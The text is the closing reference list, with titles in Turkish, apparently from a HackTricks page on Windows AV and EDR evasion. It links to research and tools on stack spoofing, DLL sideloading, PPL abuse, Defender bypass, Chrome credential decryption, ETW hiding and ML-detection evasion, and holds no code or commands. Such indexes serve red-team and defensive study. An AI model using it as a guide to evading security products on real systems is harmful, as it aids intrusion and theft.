- [8] [stackcutting – örnek](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni infection chain ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – zero trust’ınıza güvenmeli misiniz? Zscaler posture kontrollerini atlatma](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell Öncesi: Storm-2603’ün Önceki Ransomware Operasyonlarını İnceleme](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Export’ları Kötüye Kullanma](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Export Envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Süreç güvenliği ve erişim hakları](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU başvurusu (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL başlatıcısı](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) Desteğiyle EDR’lara Karşı Koyma](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Tekniğiyle Windows Defender’ın Koruyucu Kabuğunu Kırma](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink komut başvurusu](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain’ın Ardında: RAT’ten Builder’a, Oradan Coder’a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Şehre Geliyor: Yeni ve İddialı Bir Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing ile Node.js Malware’ını Etkisizleştirme](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Crystal Palace ile Adaptix’i Uykuya Yatırma](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW’nizi Gizleme](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operasyonlarında Chrome Remote Desktop’ı Kötüye Kullanma: Uygulamalı Bir Kılavuz](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender’ın Remediation Driver’ını Kernel İşlemi Primitive’i Olarak Silahlandırma](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo yardımcı kodu](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM Kullanarak Kendini Maskeleyen Fonksiyonlar Oluşturma](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole kaynak kodu](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe fonksiyonu](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Yönlendirilmiş Girdi ve Çıktıyla Alt Süreç Oluşturma](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: WasmForge ile C# Araçlarını Yeniden Biçimlendirme](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET Projelerini Derleme](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept ve kaynak kodu](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Shellcodeless DLL injection için thread pool dahili yapılarını kötüye kullanma](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark veri kümesi ve thrember araçları](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Red team implant’larını değerlendirmek için EMBER2024’ü kullanma](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Machine Learning Tabanlı Tespitlerden Kaçınma](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
